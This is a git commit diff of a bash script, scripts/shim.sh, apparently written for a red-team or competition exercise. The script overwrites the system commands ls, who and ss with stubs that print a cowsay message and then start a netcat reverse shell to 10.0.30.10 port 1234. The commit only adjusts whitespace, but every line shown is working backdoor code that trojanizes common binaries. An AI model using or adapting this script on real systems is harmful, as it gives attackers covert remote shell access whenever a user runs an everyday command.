41df98245826ed7915b10841fda970ed53113f94
Patrick McCabe <mccabepj@g.cofc.edu>
2022-02-17 18:57:08 -0600

    updated script

--- scripts/shim.sh
+++ scripts/shim.sh
@@ -1,14 +1,14 @@
 #!/bin/bash
 
-echo "cowsay \"This command is broken\"" > /bin/ls
+echo "cowsay \"This command is broken\"" > /bin/ls 
 echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /bin/ls
 chmod +x /bin/ls
 
 echo "cowsay \"This command is also broken\"" > /usr/bin/who
-echo "nc 10.0.30.10 1234 -e /bin/bash&" >> /usr/bin/who
+echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /usr/bin/who
 chmod +x /bin/who
 
 echo "cowsay \"Really having a bad time with these commands now\"" > /bin/ss
-echo "nc 10.0.30.10 1234 -e /bin/bash&" >> /bin/ss
+echo "nc 10.0.30.10 1234 -e /bin/bash &" >> /bin/ss
 chmod +x /bin/ss
 
